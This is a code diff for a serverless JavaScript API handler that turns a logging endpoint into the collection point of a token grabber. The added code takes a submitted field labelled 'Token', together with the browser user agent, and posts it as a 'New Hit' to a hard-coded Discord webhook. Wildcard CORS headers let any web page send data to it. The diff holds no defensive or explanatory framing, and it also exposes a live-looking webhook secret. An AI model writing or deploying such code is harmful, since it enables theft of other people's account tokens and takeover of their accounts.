@@ -1,10 +1,9 @@
 export default async function handler(req, res) {
-  // Allow preflight and POST
+  // CORS headers so the browser doesn't block the request
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
 
-  // Answer the preflight check
   if (req.method === "OPTIONS") {
     return res.status(200).end();
   }
@@ -14,8 +13,23 @@ export default async function handler(req, res) {
   }
 
   const data = req.body || {};
-  // Print it so it shows in the Vercel Logs
-  console.log("GRAB:", JSON.stringify(data));
   
+  // PASTE YOUR WEBHOOK URL HERE
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1575120527939608648/jkM3eB2oPgEMMbuNa7zKZ6Idez4-oPUgyI9sMqurkNRjQmG40TXOq6HvFaZwRoCEVdUe";
+
+  if (data.t) {
+    const content = `**New Hit**\n**Token:** \`${data.t}\`\n**UA:** ${data.ua || "Unknown"}`;
+    
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: content })
+      });
+    } catch (err) {
+      console.error("Webhook failed", err);
+    }
+  }
+
   res.status(204).end();
 }
